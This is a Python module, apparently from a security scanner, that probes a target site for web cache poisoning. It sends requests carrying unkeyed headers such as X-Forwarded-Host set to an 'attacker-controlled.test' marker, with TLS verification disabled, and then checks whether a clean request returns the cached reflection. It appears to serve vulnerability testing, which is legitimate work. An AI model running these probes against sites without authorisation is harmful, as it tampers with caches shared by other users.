"""
Execution logic for web cache poisoning via unkeyed headers.
"""
from __future__ import annotations

import random
import string
import urllib.parse
from dataclasses import dataclass
from typing import List, Optional

import requests

UNKEYED_HEADERS = ("X-Forwarded-Host", "X-Forwarded-Scheme", "X-Host", "X-Original-URL")


def build_probe_url(target: str, cbust_marker: str) -> str:
    """Adds a '_cbust=<marker>' query parameter to target's existing
    query string (urllib.parse.parse_qsl/urlencode, preserving any
    params already present) -- guarantees a fresh cache slot per
    attempt."""
    url = target.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"

    parsed = urllib.parse.urlparse(url)
    qs = dict(urllib.parse.parse_qsl(parsed.query))
    qs["_cbust"] = cbust_marker
    new_query = urllib.parse.urlencode(qs)
    return parsed._replace(query=new_query).geturl()


@dataclass
class PoisonAttempt:
    header_name: str
    marker_value: str
    poison_status: Optional[int] = None
    poison_body: str = ""   # FULL body, not truncated -- parse.py truncates for display
    clean_status: Optional[int] = None
    clean_body: str = ""    # FULL body, not truncated
    attempted_clean: bool = False
    error: Optional[str] = None


def attempt_header(target: str, header_name: str, timeout: int = 10) -> PoisonAttempt:
    """Sends a cache-busted request carrying a random marker in header_name,
    then a second clean request to the same URL if reflected."""
    marker = "cp" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    marker_value = f"{marker}.attacker-controlled.test"
    probe_url = build_probe_url(target, marker)

    try:
        poison_resp = requests.get(
            probe_url,
            headers={header_name: marker_value},
            timeout=timeout,
            verify=False,
        )
        poison_status = poison_resp.status_code
        poison_body = poison_resp.text or ""
    except requests.RequestException as exc:
        return PoisonAttempt(
            header_name=header_name,
            marker_value=marker_value,
            error=f"poison request failed: {exc}",
        )

    if poison_status >= 500 or marker_value not in poison_body:
        return PoisonAttempt(
            header_name=header_name,
            marker_value=marker_value,
            poison_status=poison_status,
            poison_body=poison_body,
            attempted_clean=False,
        )

    try:
        clean_resp = requests.get(
            probe_url,
            timeout=timeout,
            verify=False,
        )
        return PoisonAttempt(
            header_name=header_name,
            marker_value=marker_value,
            poison_status=poison_status,
            poison_body=poison_body,
            clean_status=clean_resp.status_code,
            clean_body=clean_resp.text or "",
            attempted_clean=True,
        )
    except requests.RequestException as exc:
        return PoisonAttempt(
            header_name=header_name,
            marker_value=marker_value,
            poison_status=poison_status,
            poison_body=poison_body,
            attempted_clean=True,
            error=f"clean request failed: {exc}",
        )


def execute(target: str, timeout: int = 10) -> List[PoisonAttempt]:
    """One attempt_header() per UNKEYED_HEADERS entry, in order. Tries
    ALL four headers even after finding one vulnerable."""
    return [attempt_header(target, h, timeout=timeout) for h in UNKEYED_HEADERS]
